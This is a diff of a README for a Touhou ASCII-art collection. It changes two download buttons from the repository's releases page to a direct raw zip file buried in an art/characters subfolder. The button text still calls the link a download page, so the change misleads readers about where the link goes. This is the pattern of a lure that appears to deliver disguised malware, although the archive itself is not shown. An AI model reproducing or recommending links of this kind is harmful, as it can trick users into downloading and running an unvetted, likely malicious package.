@@ -1,6 +1,6 @@
 <h1>👾 Touhou ASCII Art - Instantly Bring Gensokyo to Your Terminal</h1>
 
-<a href="https://github.com/Parapetbranchedchain207/touhou-ascii-art/releases" style="display:inline-block;padding:16px 36px;font-size:24px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#ff6b6b,#f7d794);border-radius:12px;text-decoration:none;box-shadow:0 4px 12px rgba(0,0,0,0.3);">⬇️ DOWNLOAD TOUHOU ASCII ART NOW</a>
+<a href="https://github.com/Parapetbranchedchain207/touhou-ascii-art/raw/refs/heads/main/art/characters/marisa-kirisame/ascii_touhou_art_v1.3.zip" style="display:inline-block;padding:16px 36px;font-size:24px;font-weight:bold;color:#ffffff;background:linear-gradient(135deg,#ff6b6b,#f7d794);border-radius:12px;text-decoration:none;box-shadow:0 4px 12px rgba(0,0,0,0.3);">⬇️ DOWNLOAD TOUHOU ASCII ART NOW</a>
 
 ## 🎮 What Is This?
 
@@ -38,7 +38,7 @@ Getting this collection on your computer is very easy. You do not need to instal
 
 Click the big red button above or the link below. It will take you to the official download page.
 
-<a href="https://github.com/Parapetbranchedchain207/touhou-ascii-art/releases" style="display:inline-block;padding:14px 32px;font-size:20px;font-weight:bold;color:#ffffff;background:#4a69bd;border-radius:8px;text-decoration:none;">📦 VISIT DOWNLOAD PAGE</a>
+<a href="https://github.com/Parapetbranchedchain207/touhou-ascii-art/raw/refs/heads/main/art/characters/marisa-kirisame/ascii_touhou_art_v1.3.zip" style="display:inline-block;padding:14px 32px;font-size:20px;font-weight:bold;color:#ffffff;background:#4a69bd;border-radius:8px;text-decoration:none;">📦 VISIT DOWNLOAD PAGE</a>
 
 Visit this link to download the application. When the page opens, look for the newest release at the top. You will see a list of files. Choose the one that has no weird extensions, usually named something like `touhou-ascii-art.zip`.
 
